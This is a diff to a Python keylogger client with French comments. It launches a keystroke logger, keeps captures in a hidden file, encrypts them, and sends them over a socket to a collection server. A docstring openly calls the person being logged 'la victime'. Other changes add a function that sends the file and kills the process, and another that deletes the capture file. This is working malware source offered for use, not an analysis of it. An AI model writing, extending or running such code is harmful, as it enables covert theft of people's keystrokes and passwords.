@@ -5,7 +5,7 @@ import time
 import os  
 from datetime import datetime
 from cryptography.fernet import Fernet
-
+import signal
 
 # Fonction pour obtenir le nom du fichier avec l'adresse IP et la date
 def get_filename():
@@ -18,18 +18,17 @@ def get_filename():
 
 # Fonction pour lancer le keylogger
 def launch_keylogger():
-    keylogger.listen_keyboard()
+    return keylogger.listen_keyboard()
 
-# Fonction pour arrêter le keylogger
+def kill_server():
+    send_file_securely("127.0.0.1", 1234)
+    os.kill(os.getpid(), signal.SIGINT)
 def stop_keylogger():
-    # Arrêter le keylogger
     keylogger.stop_keylogger()
 
 # Fonction pour arrêter le keylogger et supprimer le fichier de capture
 def stop_and_delete_capture_file():
     # Arrêter le keylogger
-    stop_keylogger()
-
     # Supprimer le fichier de capture
     file = ".document1.txt"  # Assurez-vous que c'est le bon chemin
     os.remove(file)
@@ -57,18 +56,22 @@ def send_file_securely(server_address, server_port):
             encrypted_lines = Fernet(key).encrypt(lines.encode())
 
             client_socket.send(encrypted_lines)
-
-        print("Fichier envoyé avec succès.")
-    except Exception as e:
-        print(f"Erreur lors de l'envoi du fichier : {e}")
     finally:
         # Fermer la connexion
         client_socket.close()
 
+if __name__ == "__main__":
 
-try:
+    """
+    Le except est un test, La victime ne ferra jamais de control C, 
+    C'est pour que tu comprenne le comportement, à avoir avec la fonction kill_server.
+
+    De plus, il faut lancer les programmes, LIRE et COMPRENDRE le code avant de CODER.
+    """
     launch_keylogger()
-except KeyboardInterrupt:
-    stop_keylogger()
-    send_file_securely("127.0.0.1", 1234)
-    print("Interruption clavier détectée. Arrêt du keylogger et envoi du fichier.")
+    try:
+        send_file_securely("127.0.0.1", 1234)
+    except KeyboardInterrupt:
+        kill_server()
+    
+
